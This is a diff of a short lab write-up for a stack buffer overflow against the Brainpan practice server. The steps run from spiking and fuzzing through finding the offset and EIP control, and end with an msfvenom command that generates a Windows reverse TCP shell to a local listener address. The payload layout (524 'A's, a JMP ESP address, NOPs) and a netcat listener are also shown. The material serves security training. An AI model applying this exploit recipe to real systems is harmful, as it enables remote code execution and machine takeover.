@@ -1,13 +1,13 @@
-<h1>Brainpan BOF server </h1>
-<br><h2>steps</h2></br>
-<h3>1.spiking</n>
-<br>2.fuzzing</n>
-<br>3. finding the offset
-<br>4. overwriting the EIP
-<br>5. finding bad characters
-<br>6. finding the right modules
-<br>7. Generating Shellcode</h3></br></br></br></br></br></br>
-<h2> 1. Spiking </h2> 
+<h1>Hacksudo Brainpan BOF server </h1>
+<h2>steps</h2></br>
+<h3>1 spiking</n>
+<br>2 fuzzing</n>
+<br>3 finding the offset
+<br>4 overwriting the EIP
+<br>5 finding bad characters
+<br>6 finding the right modules
+<br>7 Generating Shellcode</h3></br></br></br></br></br>
+<h2>1 Spiking </h2>
 First make sure youe firewall real protection turn off
 Now run brainpan server as admin
 use your spiking.spk to find Vulnerability 
@@ -64,14 +64,11 @@ click arrow type jump number
 fire offsetverify.py
 ./offsetverify.py IP PORT
 make sure its work you controling EIP or not if yes then go head and do shell using shellcode
-
 control EIP done
-
 
 <h2>7. Generating Shellcode</h2>
 now generarte shellcode 
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.43.216 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00\x0a"(make sure your bad chars)
-
 
 "A" * 524 + (JMP ESP value) "\xf3\x12\x17\x31"  (reverse way) +  "\x90" * 8 ( this is nops value minimum which make space between shell and JMP ESP+ shell 
 make sure your nc is ready
